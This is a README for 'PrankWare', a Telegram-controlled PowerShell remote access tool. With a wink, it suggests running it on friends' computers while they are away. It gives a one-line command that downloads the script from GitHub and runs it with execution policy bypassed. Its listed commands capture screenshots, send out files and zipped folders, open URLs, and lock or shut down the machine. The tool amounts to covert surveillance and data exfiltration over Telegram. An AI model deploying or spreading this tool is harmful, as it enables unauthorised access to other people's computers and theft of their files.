# Telegram-Controlled PowerShell Script

**Get persistent remote control access through Telegram commands.**  
Don't use it when your friends are away from their computer 🤫  
This script allows you to control a Windows system remotely through Telegram, offering various functionalities like taking screenshots, sending files, locking or restarting the system, and more.

## 🛠 Prerequisites

- Windows 10 or newer
- PowerShell 5 or later (built-in)
- Internet connection
- A Telegram bot token (from [@BotFather](https://t.me/BotFather))
- Your own Telegram user ID (use [@userinfobot](https://t.me/userinfobot))

### 📥 How to Create a Telegram Bot
1. Open Telegram and search for `@BotFather`.
2. Start a conversation and type `/newbot` to create a new bot.
3. Follow the instructions to set a name and username for your bot.
4. After completion, you will receive a **bot token** which you'll use in the script.

## 🔒 Enable Script Execution

Before running the script, allow PowerShell to execute local scripts:

## Powershell (Permanent fix)
```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```
## Powershell (One-time fix for your session)
```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```
## Powershell pipeline
```
iwr 'https://raw.githubusercontent.com/xtofuub/PrankWare/main/prankware.ps1' -UseBasicParsing -OutFile $env:TEMP\prankware.ps1; powershell -ep bypass -File $env:TEMP\prankware.ps1
```



## Available Commands

### System Control
- `/lock`: Locks the workstation.
- `/restart`: Restarts the computer.
- `/shutdown`: Shuts down the computer.
- `/notepad`: Opens Notepad.
- `/pcname`: Shows the computer name.
- `/ip`: Shows local and public IP addresses.
- `/screenshot`: Takes a screenshot and sends it to the Telegram chat.
- `/sendfile <path>`: Sends a file from the local disk to the Telegram chat.
- `/sendfolder <path>`: Sends a zipped folder from the local disk to the Telegram chat.
- `/visit <url>`: Opens a URL in the default web browser.

### Navigation and File Operations
- `cd <path>`: Change directory to the specified path.
- `cd`: Displays the current directory.
- `ls` or `dir`: Lists files and folders in the current directory.

### Help
- `/help`: Displays a list of all available commands.

